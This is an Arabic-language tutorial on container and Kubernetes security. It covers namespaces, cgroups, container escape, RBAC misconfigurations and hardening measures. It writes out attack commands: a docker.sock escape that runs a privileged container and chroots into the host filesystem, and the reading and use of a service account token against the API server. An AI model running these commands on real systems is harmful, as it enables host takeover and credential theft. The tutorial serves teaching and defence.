📚 النظرية — بنية Kubernetes وآليات عزل الحاويات

تعتمد الحاويات (Docker) على خصائص نواة لينكس مثل **Namespaces** لعزل الموارد و **cgroups** لتحديد حجم استهلاك الطاقة والمعالج. لا تعتبر الحاويات حدوداً أمنية كاملة كالأجهزة الافتراضية، مما يتيح إمكانية التخطي عند سوء التكوين.

🔓 الهروب من الحاوية (Container Escape)

الانتقال من داخل الحاوية المعزولة للسيطرة على نظام التشغيل الأساسي للمستضيف (Host OS):

  • Privileged Containers: الحاويات التي تملك صلاحيات كاملة للوصول لأجهزة وسواقات المستضيف مباشرة.
  • Writable docker.sock: إذا تم تركيب ملف الاتصال الخاص بالدوكر داخل الحاوية، يستطيع المهاجم تشغيل حاويات جديدة بامتيازات عالية والسيطرة على المستضيف.

☸️ عيوب أمان عنقود Kubernetes

يدير **Kubernetes** تشغيل الحاويات على نطاق واسع. تشمل الثغرات الجوهرية:

  • RBAC Misconfigurations: منح صلاحيات واسعة لـ Service Account يتيح للمهاجم السيطرة على العنقود.
  • Unauthenticated API Server: ترك منفذ الـ API Server (مثل 6443) مفتوحاً للعامة دون مصادقة.

🔬 تشريح خطوات الهروب واستغلال الـ RBAC

1️⃣
Docker Socket Abuse (الهروب عبر docker.sock)

إذا وجد المهاجم ملف docker.sock متاحاً داخل حاوية مخترقة، يمكنه تثبيت عميل دوكر والتواصل مباشرة مع نظام التشغيل المستضيف لرفع حاوية مميزة:

# Check if docker socket is writable ls -la /var/run/docker.sock # Run a new privileged container mounting the host root filesystem docker -H unix:///var/run/docker.sock run -it --privileged --net=host --pid=host -v /:/host alpine chroot /host
2️⃣
Kubernetes Service Account Token Extraction

داخل كبسولة Kubernetes (Pod)، يتم سحب رمز الخدمة التابع للـ Service Account المعين والتحقق من صلاحياته عبر العنقود:

# Access the token path in K8s pod cat /var/run/secrets/kubernetes.io/serviceaccount/token # Query the API server using the token kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server=https://kubernetes.default.svc get pods

🛡️ الحماية والدفاع — تأمين بيئة الحاويات

✅ تأمين الحاويات وإعدادات التثبيت

  • Drop Capabilities: إزالة الصلاحيات غير المستخدمة مثل CAP_SYS_ADMIN لمنع الهروب وتخطي الحاوية.
  • Rootless Containers: تشغيل العمليات داخل الحاوية بصلاحيات مستخدم عادي بدلاً من root.
  • ReadOnly Root Filesystem: جعل نظام ملفات الحاوية للقراءة فقط لمنع المهاجم من رفع أدوات الاختراق أو كتابة ملفات ضارة.

🔒 تحصين شبكة وعنقود Kubernetes

  • Network Policies: تطبيق سياسات الشبكة لمنع الكبسولات (Pods) من الاتصال ببعضها أو الوصول للـ API Server إلا لضرورة العمل القصوى.
  • Enforce RBAC Least Privilege: مراجعة وتدقيق الصلاحيات الممنوحة للـ Service Accounts وسحب أي صلاحيات إدارية غير ضرورية.
